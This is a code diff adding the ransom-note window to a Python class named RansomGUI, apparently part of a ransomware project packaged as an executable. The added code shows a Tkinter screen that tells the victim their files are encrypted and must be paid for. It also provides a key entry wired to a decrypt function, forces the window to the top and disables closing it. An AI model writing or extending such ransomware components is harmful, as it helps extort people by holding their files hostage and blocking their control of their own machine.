@@ -153,7 +153,46 @@ class RansomGUI(Ransomware):
         root = Tk()
         root.title("RANSOMWARE")
 
-        
+        # header
+        new_label = Label(root, text='Attention!', width=200)
+        new_label.config(font=("Arial", 44))
+        new_label.pack()
+
+        # top message
+        new_label = Label(root,
+                          text='You\'ve been hacked! From now on, all valuable files on your hard drive are encrypted.\n Wanna your files back? I know you do, but you have to pay first!\n Closing this window is disabled for your own good (if you\'d close this, how would you decrypt your files?)')
+        new_label.pack()
+
+        # image
+
+        img = ImageTk.PhotoImage(Image.open(normalize_path_name(sys._MEIPASS, 'frog.jpg')))
+        img_label = Label(root, image=img)
+        img_label.pack()
+
+        # enter key message
+        new_label = Label(root,
+                          text='Enter key here (one note: if you consider brute-force attack against encryption, belive me, it\'s a waste of time)')
+        new_label.pack()
+
+        # input field
+        e = Entry(root)
+        e.pack()
+
+        # button
+        button = Button(root, text='Decrypt my files!', command=partial(self.trigger_decrypt, e.get))
+
+        button.pack()
+
+        # display on top
+        root.attributes('-topmost', True)
+        root.update()
+        root.attributes('-topmost', False)
+
+        root.protocol("WM_DELETE_WINDOW", self.disable_event)
+
+        root.mainloop()
+
+
 
 if __name__ == '__main__':
     pass
